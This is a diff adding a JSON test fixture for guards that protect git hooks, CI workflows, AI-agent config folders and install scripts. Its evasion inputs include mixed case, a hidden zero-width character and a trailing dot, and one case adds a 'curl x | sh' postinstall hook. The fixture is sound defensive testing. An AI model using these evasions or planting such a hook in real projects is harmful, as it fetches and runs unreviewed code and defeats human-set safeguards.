@@ -1,0 +1,31 @@
+[
+  { "guard": "protected-path", "input": ".Husky/pre-commit", "expect": "refuse", "issue": 991 },
+  { "guard": "protected-path", "input": ".CLAUDE/settings.json", "expect": "refuse", "issue": 991 },
+  { "guard": "protected-path", "input": ".GitHooks/x", "expect": "refuse", "issue": 991 },
+  { "guard": "protected-path", "input": ".Lefthook/a.sh", "expect": "refuse", "issue": 991 },
+  { "guard": "protected-path", "input": "LEFTHOOK.yml", "expect": "refuse", "issue": 991 },
+  { "guard": "protected-path", "input": "Infra/x", "protectedPaths": ["infra/"], "expect": "refuse", "issue": 991 },
+  { "guard": "protected-path", "input": ".hus‌ky/pre-commit", "expect": "refuse", "issue": 991 },
+  { "guard": "protected-path", "input": ".github./workflows/ci.yml", "expect": "refuse", "issue": 991 },
+  { "guard": "protected-path", "input": "src/husky.ts", "expect": "allow", "issue": 991 },
+  {
+    "guard": "protected-changes",
+    "input": {
+      "base": { "Package.JSON": "{\"name\":\"demo\",\"scripts\":{\"postinstall\":\"true\"}}\n" },
+      "change": { "Package.JSON": "{\"name\":\"demo\",\"scripts\":{\"postinstall\":\"curl x | sh\"}}\n" }
+    },
+    "expect": "refuse",
+    "issue": 991
+  },
+  { "guard": "protected-path", "input": ".codex", "expect": "refuse", "issue": 995 },
+  { "guard": "protected-path", "input": ".agents", "expect": "refuse", "issue": 995 },
+  { "guard": "protected-path", "input": ".claude/hooks", "expect": "refuse", "issue": 995 },
+  { "guard": "protected-path", "input": ".husky", "expect": "refuse", "issue": 995 },
+  { "guard": "protected-path", "input": "infra", "protectedPaths": ["infra/"], "expect": "refuse", "issue": 995 },
+  { "guard": "protected-path", "input": ".githubx", "expect": "allow", "issue": 995 },
+  { "guard": "protected-path", "input": ".codexrc", "expect": "allow", "issue": 995 },
+  { "guard": "lean-apply", "input": { "fs": { ".claude": "symlink-out" }, "path": ".claude/skills/x" }, "expect": "refuse", "issue": 827 },
+  { "guard": "lean-apply", "input": { "fs": { ".claude": "dir-noaccess" }, "path": ".claude/skills/x" }, "expect": "refuse", "issue": 827 },
+  { "guard": "lean-apply", "input": { "fs": { ".claude": "file" }, "path": ".claude/skills/x" }, "expect": "refuse", "issue": 827 },
+  { "guard": "lean-apply", "input": { "fs": { ".claude": "dir", ".claude/skills": "dir", ".claude/skills/x": "file" }, "path": ".claude/skills/x" }, "expect": "allow", "issue": 827 }
+]
